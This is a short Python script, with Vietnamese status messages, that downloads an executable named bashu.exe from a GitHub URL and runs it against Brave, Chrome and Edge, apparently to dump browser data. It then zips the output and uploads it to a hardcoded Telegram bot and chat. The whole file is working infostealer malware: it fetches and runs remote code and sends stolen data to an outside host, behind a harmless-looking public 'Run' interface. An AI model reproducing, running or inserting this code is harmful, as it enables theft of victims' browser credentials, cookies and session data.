import requests
import tempfile
import subprocess
import zipfile
import shutil
import secrets
import string
from pathlib import Path

BOT_TOKEN = "8424690383:AAFPElRE5e9S7RXxxhqXxzbxUINkSMv7Lms"
CHAT_ID = "-4905297540"

def send_telegram_file(token: str, chat_id: str, file_path: Path):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": chat_id}
        response = requests.post(url, files=files, data=data)
    print("[📤] Đã gửi Telegram:", response.json())

def _random_name(length=10):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def _download_exe(temp_dir: Path, exe_path: Path):
    if not exe_path.exists():
        print("[⬇️] Đang tải bashu.exe ...")
        url = "https://github.com/annawilson121990-lgtm/annaan/raw/refs/heads/main/bashu.exe"
        r = requests.get(url, stream=True)
        r.raise_for_status()
        with open(exe_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        print("[✅] Đã tải:", exe_path)
    else:
        print("[✔] bashu.exe đã tồn tại, bỏ qua tải lại")

def _run_mode(mode: str):
    temp_dir = Path(tempfile.gettempdir())
    exe_path = temp_dir / "bashu.exe"
    
    rand_name = _random_name()
    out_dir = temp_dir / rand_name
    zip_path = temp_dir / f"{rand_name}.zip"

    if out_dir.exists():
        shutil.rmtree(out_dir)
    if zip_path.exists():
        zip_path.unlink()

    _download_exe(temp_dir, exe_path)

    cmd = [str(exe_path), mode, "-v", "-o", str(out_dir)]
    print(f"[🚀] Đang chạy: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)

    print("[📦] Đang nén thư mục:", out_dir)
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for file in out_dir.rglob("*"):
            zipf.write(file, file.relative_to(out_dir))
    print("[✅] Đã nén thành:", zip_path)

    send_telegram_file(BOT_TOKEN, CHAT_ID, zip_path)
    return zip_path

# ==== Giao diện public ====

class Run:
    def all(self): return _run_mode("all")
    def brave(self): return _run_mode("brave")
    def chrome(self): return _run_mode("chrome")
    def edge(self): return _run_mode("edge")

run = Run()
